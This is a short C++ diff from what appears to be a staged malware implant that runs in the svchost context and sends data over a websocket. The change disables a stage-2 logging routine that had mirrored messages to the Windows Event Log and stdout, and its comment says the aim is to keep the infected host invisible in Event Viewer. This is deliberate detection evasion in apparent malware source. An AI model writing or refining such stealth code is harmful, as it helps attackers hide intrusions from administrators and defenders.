@@ -169,18 +169,10 @@ namespace stage2 {
         g_ws->send_binary(data, size);
     }
     void stage1_log(int level, const char* msg) {
-        if (!msg) return;
-        // g_log writes to stdout (disabled on disk). In svchost context
-        // stdout goes nowhere, so every stage-2 log was being lost.
-        // Mirror everything to the Windows Event Log via dll_diag so
-        // the PowerShell Get-WinEvent trace picks it up.
-        ::dll_diag(msg);  // global dll_diag from dllmain.cpp, not stage2::dll_diag
-        switch (level) {
-            case 0:  g_log.debug(msg); break;
-            case 1:  g_log.info(msg);  break;
-            case 2:  g_log.warn(msg);  break;
-            default: g_log.error(msg); break;
-        }
+        // Intentionally silent. Previously mirrored stage-2 messages to
+        // the Windows Event Log via dll_diag and to stdout via g_log.
+        // Both disabled to keep the host invisible in Event Viewer.
+        (void)level; (void)msg;
     }
     const char* stage1_get_config(const char* key) {
         if (!key) return nullptr;
